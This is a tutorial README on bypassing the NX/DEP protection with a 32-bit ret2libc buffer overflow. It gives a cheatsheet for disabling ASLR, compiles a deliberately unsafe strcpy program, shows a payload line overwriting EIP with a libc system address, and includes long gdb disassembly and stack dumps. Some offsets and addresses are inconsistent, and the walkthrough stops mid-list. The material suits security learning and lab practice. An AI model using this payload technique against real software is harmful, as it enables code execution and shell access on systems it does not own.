README
======

#### CHEATSHEET:
`$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`

`$ gcc nx_bypass.c -o nx_bypass -fno-stack-protector -Wl,-z,norelro -no-pie -m32`

`$ p system`

`$ p execve`

`$ p exit`

`$ find /bin/sh`

`$ disass main`

`$ b *address`

`$ r AAAA`

`$ r $(python -c 'print "A"*36 + "\xe0\x9f\xe9\xf7"')`

`$ x/64wx $esp`


#### VULNERABLE CODE:
```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, const char* argv[]) 
{
	if(argc != 2)
	{
		printf("Usage %s <text>\n", argv[0]);
		exit(1);
	}

	char buf[40];
	strcpy(buf, argv[1]);
	printf("You wrote: %s\n", buf);
	return 0;
}
```


# Bypass NX (DEP) Techniques
DEP stands for Data Execution Prevention which makes the stack not executable thanks to the NX bit (AMD arch) or XD bit (Intel arch).
This protection will prevent the execution of the code present inside the stack after a buffer overflow occurs. This means that the program will
crash with SIGSEGV and your shellcode won't be executed.
 
## x32
### ret2libc
This is a technique to bypass NX and stands for return to libc. The purpose of this technique is to call a function present inside the standard C library.
Libc is the standard C Library in Linux, which is present on all systems by default and contains some basic functions required for programs to run properly.
Possible functions to be used are: system, execl, execle, exelp, execv, execve, etc.

Libc is mapped into memory during the execution of the program, it can be seen inside gdb running the following command:

`$ vmmap libc`

```
Start      End        Perm	Name
0xf7dd7000 0xf7df4000 r--p	/usr/lib32/libc-2.29.so
0xf7df4000 0xf7f3f000 r-xp	/usr/lib32/libc-2.29.so
0xf7f3f000 0xf7fac000 r--p	/usr/lib32/libc-2.29.so
0xf7fac000 0xf7fae000 r--p	/usr/lib32/libc-2.29.so
0xf7fae000 0xf7fb0000 rw-p	/usr/lib32/libc-2.29.so
```

To move forward, below are listed the main steps to follow:

1. Find system function address inside libc in memory

`$ p system`

2. Find exit function address inside libc in memory

`$ p exit`

3. Find /bin/sh string inside libc in memory

`$ find /bin/sh`

Make sure any of the found addresses doesn't have null bytes \x00 if strcpy is going to be exploited. Also the space \x20 will cause trouble.

The basic of buffer overflow says that if you can control the instruction pointer register (EIP) then you can control the execution of the program.

So first of all check if you can control EIP register (to know how check basic BOF tutorials, here it won't be covered).
Once you have found the offset to control the EIP register, since you cannot put your shellcode inside the stack (which it's not executable, remember?) you will overwrite EIP address with the address of the found libc system function (that's why ret2libc). In this way you will redirect the program to a function already present in memory.

Things to note here:
system function needs an argument which will be the program we want to execute, in this case /bin/sh (not the string itself but the address containing the string). This is why we searched for /bin/sh string inside memory.

### Payload analysis
The payload to bypass NX will have the following structure:

`padding + system + exit + /bin/sh`

Where /bin/sh is the argument of system("/bin/sh" function.

Things to note here:
A call to a function will push the return address into the stack and this is exactly after the EBP register, that's why exit function is placed just after system() in our payload.

#### Why
During a function call the arguments of the function will be pushed into the stack, then calling a function will push automatically the return address into the stack so the program know where to go after the function has been executed.

Let's run nx_bypass inside gdb, take a look at our main function and set a breakpoint to the strcpy call.
Note that I am using a compiled 32 bit program inside 64 bit Linux VM.

```
gdb-peda$ disass main
Dump of assembler code for function main:
   0x080491d6 <+0>:	endbr32 
   0x080491da <+4>:	lea    ecx,[esp+0x4]
   0x080491de <+8>:	and    esp,0xfffffff0
   0x080491e1 <+11>:	push   DWORD PTR [ecx-0x4]
   0x080491e4 <+14>:	push   ebp
   0x080491e5 <+15>:	mov    ebp,esp
   0x080491e7 <+17>:	push   ebx
   0x080491e8 <+18>:	push   ecx
   0x080491e9 <+19>:	sub    esp,0x400
   0x080491ef <+25>:	call   0x8049110 <__x86.get_pc_thunk.bx>
   0x080491f4 <+30>:	add    ebx,0x2e0c
   0x080491fa <+36>:	mov    eax,ecx
   0x080491fc <+38>:	cmp    DWORD PTR [eax],0x2
   0x080491ff <+41>:	je     0x8049223 <main+77>
   0x08049201 <+43>:	mov    eax,DWORD PTR [eax+0x4]
   0x08049204 <+46>:	mov    eax,DWORD PTR [eax]
   0x08049206 <+48>:	sub    esp,0x8
   0x08049209 <+51>:	push   eax
   0x0804920a <+52>:	lea    eax,[ebx-0x1ff8]
   0x08049210 <+58>:	push   eax
   0x08049211 <+59>:	call   0x8049080 <printf@plt>
   0x08049216 <+64>:	add    esp,0x10
   0x08049219 <+67>:	sub    esp,0xc
   0x0804921c <+70>:	push   0x1
   0x0804921e <+72>:	call   0x80490a0 <exit@plt>
   0x08049223 <+77>:	mov    eax,DWORD PTR [eax+0x4]
   0x08049226 <+80>:	add    eax,0x4
   0x08049229 <+83>:	mov    eax,DWORD PTR [eax]
   0x0804922b <+85>:	sub    esp,0x8
   0x0804922e <+88>:	push   eax
   0x0804922f <+89>:	lea    eax,[ebp-0x408]
   0x08049235 <+95>:	push   eax
   *0x08049236 <+96>:	call   0x8049090 <strcpy@plt>
   **0x0804923b <+101>:	add    esp,0x10
   0x0804923e <+104>:	sub    esp,0x8
   0x08049241 <+107>:	lea    eax,[ebp-0x408]
   0x08049247 <+113>:	push   eax
   0x08049248 <+114>:	lea    eax,[ebx-0x1fe7]
   0x0804924e <+120>:	push   eax
   0x0804924f <+121>:	call   0x8049080 <printf@plt>
   0x08049254 <+126>:	add    esp,0x10
   0x08049257 <+129>:	mov    eax,0x0
   0x0804925c <+134>:	lea    esp,[ebp-0x8]
   0x0804925f <+137>:	pop    ecx
   0x08049260 <+138>:	pop    ebx
   0x08049261 <+139>:	pop    ebp
   0x08049262 <+140>:	lea    esp,[ecx-0x4]
   0x08049265 <+143>:	ret    
End of assembler dump.

```
*Breakpoint

**Return address of the call to strcpy

Let's set a breakpoint at the strcpy call 0x08049236

`$ b *0x08049236`

Let's run the program and examine the stack.

`$ r AAAA`

```
[-------------------------------------code---------------------------]
   0x804922e <main+88>:	push   eax
   0x804922f <main+89>:	lea    eax,[ebp-0x408]
   0x8049235 <main+95>:	push   eax
=> 0x8049236 <main+96>:	call   0x8049090 <strcpy@plt>
   0x804923b <main+101>:	add    esp,0x10
   0x804923e <main+104>:	sub    esp,0x8
   0x8049241 <main+107>:	lea    eax,[ebp-0x408]
   0x8049247 <main+113>:	push   eax
Guessed arguments:
arg[0]: 0xffffcd20 --> 0xf7dd690c --> 0x0 
arg[1]: 0xffffd3c8 ("AAAA")
[------------------------------------stack---------------------------]
ESP => 0000| 0xffffcd10 --> 0xffffcd20 --> 0xf7dd690c --> 0x0 
       0004| 0xffffcd14 --> 0xffffd3c8 ("AAAA")
       0008| 0xffffcd18 --> 0xf7ffd000 --> 0x29f38 
       0012| 0xffffcd1c --> 0x80491f4 (<main+30>:	add    ebx,0x2e0c)
       0016| 0xffffcd20 --> 0xf7dd690c --> 0x0 
       0020| 0xffffcd24 --> 0xf7fd37a2 ("_dl_catch_error")
       0024| 0xffffcd28 --> 0xf7dd768c --> 0x357e ('~5')
       0028| 0xffffcd2c --> 0x677f9a5f 
[--------------------------------------------------------------------]
```
As we can see the two arguments of strcpy have been pushed inside the stack. Note that we still have to run the call instruction. (I manually added "ESP =>" note above)

`strcpy(buf, argv[1]);`

The first argument is at 0000 inside the stack frame and it corresponds to the buf variable in our code.
The second argument is at 0004 and it's the string we passed to the program (argv[1]).

If we step into the call we will see that the return address 0x0804923b (aka where the program goes after the call instruction have been completed) will be pushed into the stack and at this point the stack will look like this


ESP  | return addr |
-----|-------------|
0004 | argument 1  |
0008 | argument 2  |


```
gdb-peda$ si
[----------------------------------registers-------------------------]
EAX: 0xffffcd20 --> 0xf7dd690c --> 0x0 
EBX: 0x804c000 --> 0x804bf14 --> 0x1 
ECX: 0xffffd140 --> 0x2 
EDX: 0xffffd164 --> 0x0 
ESI: 0xf7fb5000 --> 0x1e5d6c 
EDI: 0xf7fb5000 --> 0x1e5d6c 
EBP: 0xffffd128 --> 0x0 
ESP: 0xffffcd0c --> 0x804923b (<main+101>:	add    esp,0x10)
EIP: 0x8049090 (<strcpy@plt>:	endbr32)
EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code---------------------------]
   0x8049080 <printf@plt>:	endbr32 
   0x8049084 <printf@plt+4>:	jmp    DWORD PTR ds:0x804c00c
   0x804908a <printf@plt+10>:	nop    WORD PTR [eax+eax*1+0x0]
=> 0x8049090 <strcpy@plt>:	endbr32 
   0x8049094 <strcpy@plt+4>:	jmp    DWORD PTR ds:0x804c010
   0x804909a <strcpy@plt+10>:	nop    WORD PTR [eax+eax*1+0x0]
   0x80490a0 <exit@plt>:	endbr32 
   0x80490a4 <exit@plt+4>:	jmp    DWORD PTR ds:0x804c014
[------------------------------------stack---------------------------]
0000| 0xffffcd0c --> 0x804923b (<main+101>:	add    esp,0x10)
0004| 0xffffcd10 --> 0xffffcd20 --> 0xf7dd690c --> 0x0 
0008| 0xffffcd14 --> 0xffffd3c8 ("AAAA")
0012| 0xffffcd18 --> 0xf7ffd000 --> 0x29f38 
0016| 0xffffcd1c --> 0x80491f4 (<main+30>:	add    ebx,0x2e0c)
0020| 0xffffcd20 --> 0xf7dd690c --> 0x0 
0024| 0xffffcd24 --> 0xf7fd37a2 ("_dl_catch_error")
0028| 0xffffcd28 --> 0xf7dd768c --> 0x357e ('~5')
[--------------------------------------------------------------------]
Legend: code, data, rodata, value
0x08049090 in strcpy@plt ()

```

Let's try to trigger the buffer overflow and examine the stack, but first add a breakpoint just after the call to strcpy.

```
[-------------------------------------code---------------------------]
   0x804922f <main+89>:	lea    eax,[ebp-0xd0]
   0x8049235 <main+95>:	push   eax
   0x8049236 <main+96>:	call   0x8049090 <strcpy@plt>
=> 0x804923b <main+101>:	add    esp,0x10
   0x804923e <main+104>:	sub    esp,0x8
   0x8049241 <main+107>:	lea    eax,[ebp-0xd0]
   0x8049247 <main+113>:	push   eax
   0x8049248 <main+114>:	lea    eax,[ebx-0x1fe7]
[------------------------------------stack---------------------------]
0000| 0xffffcf80 --> 0xffffcf98 ('A' <repeats 200 times>)
0004| 0xffffcf84 --> 0xffffd304 ('A' <repeats 200 times>)
0008| 0xffffcf88 --> 0x0 
0012| 0xffffcf8c --> 0x80491f4 (<main+30>:	add    ebx,0x2e0c)
0016| 0xffffcf90 --> 0x0 
0020| 0xffffcf94 --> 0x0 
0024| 0xffffcf98 ('A' <repeats 200 times>)
0028| 0xffffcf9c ('A' <repeats 196 times>)
[--------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 2, 0x0804923b in main ()

gdb-peda$ x/64wx $esp
0xffffcf80:	0xffffcf98	0xffffd304	0x00000000	0x080491f4
0xffffcf90:	0x00000000	0x00000000	0x41414141	0x41414141
0xffffcfa0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcfb0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcfc0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcfd0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcfe0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcff0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd000:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd010:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd020:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd030:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd040:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd050:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd060:	0xffffd000	0x00000000	0x00000000	0xf7dedfb9
0xffffd070:	0xf7fb5000	0xf7fb5000	0x00000000	0xf7dedfb9
```





At 0x08049184 /bin/sh is pushed into the stack to be used as system argument.

4. The found system address will be inside EIP register
5. After EIP regiter there will be the return address



